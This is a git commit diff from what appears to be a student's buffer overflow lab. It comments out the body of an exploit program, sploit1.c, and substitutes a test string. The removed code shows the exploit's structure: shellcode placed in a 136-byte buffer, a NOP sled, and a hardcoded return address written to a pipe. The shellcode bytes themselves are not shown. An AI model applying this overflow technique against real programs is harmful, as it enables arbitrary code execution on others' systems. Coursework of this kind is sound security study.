274d6654fe6bd2a49fb8765f834e319e6bf519bf
ishanphadke <44324805+ishanphadke@users.noreply.github.com>
2020-10-23 17:06:42 -0500

    messing with sploit1

--- lab4/buffer_overflow/sploit1.c
+++ lab4/buffer_overflow/sploit1.c
@@ -8,23 +8,23 @@
 
 int main(void)
 {
-        char buffr[136];
-        char add[] = "\x01\x20\xa7\xbb";
-        int i;
+        // char buffr[136];
+        // char add[] = "\x01\x20\xa7\xbb";
+        // int i;
 
-        memcpy(buffr,"\x90",1);
+        // memcpy(buffr,"\x90",1);
 
 
-        memcpy(buffr+1,shellcode,strlen(shellcode));
+        // memcpy(buffr+1,shellcode,strlen(shellcode));
 
-        for(i = 84; i < 131; i++)
-                memcpy(buffr + i, "\x90",1);
+        // for(i = 84; i < 131; i++)
+        //         memcpy(buffr + i, "\x90",1);
 
-        strcpy(buffr + 131, add);
-        writecmd(PIPEPATH, buffr);
+        // strcpy(buffr + 131, add);
+        writecmd(PIPEPATH, "AAAA");
 
-//      int retadd = 0xbba72000;
- // writecmd(PIPEPATH, "ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssstttt");
+        // int retadd = 0xbba72000;
+        // writecmd(PIPEPATH, "ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssstttt");
   //
   return 0;
 }
